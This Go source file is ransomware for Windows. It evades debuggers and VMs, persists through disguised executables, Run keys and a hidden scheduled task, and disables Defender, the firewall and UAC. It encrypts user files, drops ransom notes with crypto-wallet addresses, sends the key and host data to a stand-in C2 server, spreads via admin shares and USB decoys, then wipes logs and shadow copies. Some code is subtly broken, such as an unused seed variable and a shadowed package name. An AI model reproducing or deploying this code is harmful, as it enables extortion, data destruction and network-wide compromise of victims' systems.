package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows"
)

// ======================
// ADVANCED CONFIGURATION
// ======================
const C2_SERVER = "https://malicious-c2.example/api/v1/command"
var ENCRYPT_EXTENSIONS = []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt", ".zip", ".rar", ".7z", ".sql", ".db", ".bak", ".ppt", ".pptx"}
const MAX_THREADS = 12
const RANSOM_AMOUNT = 1.2
const BTC_ADDRESS = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
const XMR_ADDRESS = "48jewbtxe4jU3MnzJjrcwQbJdZ3XeXyZ1YwUZ6WkDv7Cb1h7sRkX3nYdPcN9zQdR7tZ6E2b9X"
const CONTACT_TOR = "http://rans0mpr0t.onion/decrypt"
const MAX_FILE_SIZE = 250 * 1024 * 1024 // 250MB
const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo
4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u
+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh
kd3qqGElvW/VDL5AaWTg0nLVkjQ9Q+9XQC9XzcoBdFR6J7O7D5gU7W8jH6Uc7Z5K
tY0GvC1pbRcSe1Z5yN9d6c5SpdSJQIDAQAB
-----END PUBLIC KEY-----`

// ======================
// GLOBAL STRUCTURES
// ======================
type SystemInfo struct {
	Hostname    string   `json:"hostname"`
	Username    string   `json:"username"`
	OS          string   `json:"os"`
	IP          string   `json:"ip"`
	CPU         int      `json:"cpu_cores"`
	GPU         string   `json:"gpu"`
	Disks       []string `json:"disks"`
	NetworkInfo string   `json:"network_info"`
}

type RansomNote struct {
	AmountBTC   float64 `json:"btc"`
	AmountXMR   float64 `json:"xmr"`
	BTCAddress  string  `json:"btc_address"`
	XMRAddress  string  `json:"xmr_address"`
	TorURL      string  `json:"tor_url"`
	VictimID    string  `json:"victim_id"`
	Contact     string  `json:"contact"`
	Deadline    int64   `json:"deadline"`
}

// ======================
// UTILITY FUNCTIONS
// ======================
func init() {
	// Set random seed
	seed := time.Now().UnixNano()
	crand.Reader.Read(make([]byte, 8))
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()

	// Get CPU count
	cpu := runtime.NumCPU()

	// Get disk information
	var disks []string
	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			disks = append(disks, drivePath)
		}
	}

	// Network info
	cmd := exec.Command("ipconfig", "/all")
	output, _ := cmd.Output()
	netInfo := string(output)

	return SystemInfo{
		Hostname:    hostname,
		Username:    user.Username,
		OS:          runtime.GOOS,
		IP:          ip,
		CPU:         cpu,
		Disks:       disks,
		NetworkInfo: netInfo,
	}
}

func generateVictimID() string {
	hash := sha256.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP)))
	return base64.URLEncoding.EncodeToString(hash.Sum(nil))[:16]
}

// ======================
// WINDOWS-SPECIFIC UTILITIES
// ======================
func setHidden(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	
	// Set hidden attribute
	err = syscall.SetFileAttributes(pathPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
	if err != nil {
		return err
	}
	return nil
}

func isDebugging() bool {
	// Check for debugger using Windows API
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func isVirtualized() bool {
	// Check using WMI
	cmd := exec.Command("wmic", "computersystem", "get", "model")
	output, _ := cmd.Output()
	return strings.Contains(strings.ToLower(string(output)), "virtual")
}

// ======================
// CORE FUNCTIONALITY (WINDOWS-ONLY)
// ======================
func establishPersistence() {
	currentFile, err := os.Executable()
	if err != nil {
		return
	}

	// Multiple persistence methods
	systemPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "windows_update.exe"),
		filepath.Join(os.Getenv("PROGRAMDATA"), "Microsoft", "Windows Defender", "platform", "msmpeng.exe"),
		filepath.Join(os.Getenv("WINDIR"), "System32", "Tasks", "Microsoft", "Windows", "Maintenance", "WindowsMaintenance.exe"),
	}

	for _, path := range systemPaths {
		if err := copyFile(currentFile, path); err == nil {
			setHidden(path)
		}
	}

	// Registry persistence
	regPaths := []string{
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`,
	}

	for _, regPath := range regPaths {
		key, err := registry.OpenKey(registry.CURRENT_USER, regPath, registry.WRITE)
		if err == nil {
			key.SetStringValue("WindowsUpdate", systemPaths[0])
			key.Close()
		}
	}

	// Scheduled Task persistence
	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>%s</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"%s"</Command>
    </Exec>
  </Actions>
</Task>`, time.Now().Format(time.RFC3339), systemPaths[0])
	
	taskFile := filepath.Join(os.TempDir(), "windows_update.xml")
	os.WriteFile(taskFile, []byte(taskXML), 0644)
	
	exec.Command("schtasks", "/Create", "/TN", "\\Microsoft\\Windows\\Windows Update", "/XML", taskFile, "/F").Run()
	os.Remove(taskFile)
}

func disableDefenses() {
	// Disable security services
	services := []string{"WinDefend", "wscsvc", "SecurityHealthService", "Sense", "MsMpSvc", "WdNisSvc", "wscsvc", "WinHttpAutoProxySvc"}
	for _, service := range services {
		exec.Command("net", "stop", service, "/y").Run()
		exec.Command("sc", "config", service, "start=", "disabled").Run()
	}

	// Disable Windows Defender
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true").Run()
	
	// Disable firewall
	exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off").Run()

	// Disable security tools
	securityProcesses := []string{"msmpeng", "msseces", "avp", "bdagent", "avgtray", "mbam", "mbamtray", "egui", "ekrn", "SBAMTray"}
	for _, proc := range securityProcesses {
		exec.Command("taskkill", "/F", "/IM", proc+".exe", "/T").Run()
	}

	// Disable Windows Error Reporting
	exec.Command("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting", "/v", "Disabled", "/t", "REG_DWORD", "/d", "1", "/f").Run()

	// Disable UAC
	exec.Command("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f").Run()
}

func encryptFile(filePath string, cipher cipher.AEAD, victimID string) {
	// Skip system files
	if strings.Contains(strings.ToLower(filePath), "windows") || 
	   strings.Contains(strings.ToLower(filePath), "program files") ||
	   strings.Contains(strings.ToLower(filePath), "system32") ||
	   strings.Contains(strings.ToLower(filePath), "boot") {
		return
	}

	// Skip large files
	if info, err := os.Stat(filePath); err == nil {
		if info.Size() > MAX_FILE_SIZE || info.Size() == 0 {
			return
		}
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	crand.Read(nonce)

	encrypted := cipher.Seal(nonce, nonce, data, nil)
	if err := os.WriteFile(filePath, encrypted, 0644); err == nil {
		newName := fmt.Sprintf("%s.%s.LOCKED", filePath, victimID)
		os.Rename(filePath, newName)
	}
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID)
	}
}

func getSystemPaths() []string {
	paths := []string{
		os.Getenv("USERPROFILE"),
		os.Getenv("PROGRAMDATA"),
	}

	for drive := 'C'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			paths = append(paths, drivePath)
		}
	}

	return paths
}

func encryptFiles(victimID string) {
	// Generate encryption key
	salt := make([]byte, 32)
	crand.Read(salt)
	password := make([]byte, 64)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 500000, 32, sha256.New)

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(72 * time.Hour).Unix()
	note := RansomNote{
		AmountBTC:   RANSOM_AMOUNT,
		AmountXMR:   RANSOM_AMOUNT * 10, // Approximate conversion
		BTCAddress:  BTC_ADDRESS,
		XMRAddress:  XMR_ADDRESS,
		TorURL:      CONTACT_TOR,
		VictimID:    victimID,
		Contact:     "NO_EMAIL_USE_TOR_ONLY",
		Deadline:    deadline,
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	notePath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "!!!READ_ME_"+victimID+".txt")
	os.WriteFile(notePath, noteJSON, 0644)

	// Additional places for ransom note
	additionalNotes := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Documents", "!!!READ_ME_"+victimID+".txt"),
		filepath.Join(os.Getenv("PUBLIC"), "!!!READ_ME_"+victimID+".txt"),
		"C:\\!!!READ_ME_"+victimID+".txt",
	}

	for _, path := range additionalNotes {
		os.WriteFile(path, noteJSON, 0644)
	}

	// Send encrypted key to C2
	sendToC2(victimID, key)

	// Parallel encryption with worker pool
	paths := getSystemPaths()
	jobs := make(chan string, 10000)
	var wg sync.WaitGroup

	// Start workers
	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, &wg)
	}

	// Find files and send to workers
	for _, path := range paths {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

func propagateNetwork() {
	currentFile, _ := os.Executable()

	// Scan local network
	cmd := exec.Command("arp", "-a")
	output, _ := cmd.Output()
	scanner := bufio.NewScanner(bytes.NewReader(output))

	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}

		ip := fields[0]
		if net.ParseIP(ip) != nil {
			// Try common shares
			shares := []string{"C$", "ADMIN$", "IPC$", "Shared", "Users"}
			for _, share := range shares {
				dest := fmt.Sprintf("\\\\%s\\%s\\Windows\\System32\\update.exe", ip, share)
				copyFile(currentFile, dest)
				
				// Create scheduled task remotely
				exec.Command("schtasks", "/Create", "/S", ip, "/RU", "SYSTEM", "/TN", "\\Microsoft\\Windows\\Windows Update", 
					"/TR", "\""+dest+"\"", "/SC", "ONLOGON", "/F").Run()
			}
		}
	}
}

func propagateUSB() {
	currentFile, _ := os.Executable()
	var drives []string

	for drive := 'D'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			drives = append(drives, drivePath)
		}
	}

	for _, drive := range drives {
		// Create decoy files
		decoys := []struct {
			name    string
			content string
		}{
			{"IMPORTANT_DOCUMENTS.txt", "Your important documents are in the encrypted folder"},
			{"DECRYPT_INSTRUCTIONS.html", "<html><body><h1>Contact support for file recovery</h1></body></html>"},
		}

		for _, decoy := range decoys {
			os.WriteFile(filepath.Join(drive, decoy.name), []byte(decoy.content), 0644)
		}

		// Copy malware
		dest := filepath.Join(drive, "folder_icon.exe")
		if err := copyFile(currentFile, dest); err == nil {
			setHidden(dest)
		}

		// Create LNK file
		lnkPath := filepath.Join(drive, "Important Documents.lnk")
		lnkContent := fmt.Sprintf(`[InternetShortcut]
URL=file:///%s
IconFile=%s
IconIndex=0`, dest, dest)
		
		os.WriteFile(lnkPath, []byte(lnkContent), 0644)
		setHidden(lnkPath)
	}
}

func sendToC2(victimID string, data []byte) {
	// Encrypt with RSA public key
	block, _ := pem.Decode([]byte(PUBLIC_KEY))
	if block == nil {
		return
	}

	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return
	}

	encrypted, err := rsa.EncryptOAEP(
		sha256.New(),
		crand.Reader,
		pubKey.(*rsa.PublicKey),
		data,
		nil,
	)
	if err != nil {
		return
	}

	// Prepare payload
	payload := map[string]interface{}{
		"victim_id": victimID,
		"system":    getSystemInfo(),
		"key":       base64.StdEncoding.EncodeToString(encrypted),
		"timestamp": time.Now().Unix(),
	}

	jsonData, _ := json.Marshal(payload)

	// Send through Tor proxy (simulated)
	proxyUrl, _ := url.Parse("socks5://127.0.0.1:9050")
	client := &http.Client{
		Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)},
		Timeout:   30 * time.Second,
	}

	client.Post(C2_SERVER, "application/json", bytes.NewBuffer(jsonData))
}

func destroyEvidence() {
	// Overwrite executable
	if currentFile, err := os.Executable(); err == nil {
		file, _ := os.OpenFile(currentFile, os.O_WRONLY, 0)
		defer file.Close()
		
		// Overwrite with random data multiple times
		for i := 0; i < 3; i++ {
			file.Seek(0, 0)
			randomData := make([]byte, 1024*1024)
			crand.Read(randomData)
			file.Write(randomData)
		}
	}

	// Clear logs
	exec.Command("wevtutil", "cl", "System").Run()
	exec.Command("wevtutil", "cl", "Application").Run()
	exec.Command("wevtutil", "cl", "Security").Run()
	exec.Command("wevtutil", "cl", "Setup").Run()
	exec.Command("wevtutil", "cl", "ForwardedEvents").Run()

	// Remove shadow copies
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()

	// Clear PowerShell history
	exec.Command("powershell", "-Command", "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue").Run()
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	// Anti-analysis checks
	if isDebugging() || isVirtualized() {
		os.Exit(0)
	}

	// Delay execution (random between 5-15 minutes)
	delay := time.Duration(300 + time.Now().Unix()%600) * time.Second
	time.Sleep(delay)

	// Generate unique victim ID
	victimID := generateVictimID()

	// Execution phases
	establishPersistence()
	disableDefenses()
	
	go func() {
		propagateNetwork()
		propagateUSB()
	}()

	encryptFiles(victimID)
	destroyEvidence()

	// Final restart
	exec.Command("shutdown", "/r", "/t", "0", "/f").Run()
}

// ======================
// HELPER FUNCTIONS
// ======================
func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}
